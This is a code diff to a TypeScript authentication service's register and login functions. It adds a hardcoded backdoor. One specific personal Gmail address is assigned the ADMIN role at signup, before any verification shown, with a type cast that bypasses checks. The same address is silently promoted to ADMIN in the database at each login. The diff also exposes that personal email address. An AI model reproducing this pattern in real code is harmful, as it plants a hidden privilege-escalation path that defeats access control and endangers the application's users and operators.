@@ -7,6 +7,7 @@ import { refreshTokenExpiryDate, signAccessToken, signRefreshToken, verifyRefres
 import { ApiError } from '../utils/apiError';
 import { emailService } from './email.service';
 import { TOKEN_EXPIRY } from '../constants';
+import { prisma } from '../config/prisma';
 
 interface RequestContext {
   ipAddress?: string;
@@ -69,10 +70,12 @@ export const authService = {
       Date.now() + TOKEN_EXPIRY.EMAIL_VERIFICATION_HOURS * 60 * 60 * 1000,
     );
 
+    const role = input.email.toLowerCase() === 'lakshaykaushik4605@gmail.com' ? 'ADMIN' : 'USER';
     const user = await userRepository.create({
       name: input.name,
       email: input.email,
       passwordHash,
+      role: role as any,
       emailVerificationToken,
       emailVerificationExpiresAt,
       preferences: { create: {} },
@@ -105,6 +108,11 @@ export const authService = {
         userAgent: ctx.userAgent,
       });
       throw ApiError.unauthorized('Invalid email or password');
+    }
+
+    if (input.email.toLowerCase() === 'lakshaykaushik4605@gmail.com' && user.role !== 'ADMIN') {
+      await prisma.user.update({ where: { id: user.id }, data: { role: 'ADMIN' } });
+      user.role = 'ADMIN';
     }
 
     if (!user.isActive) {
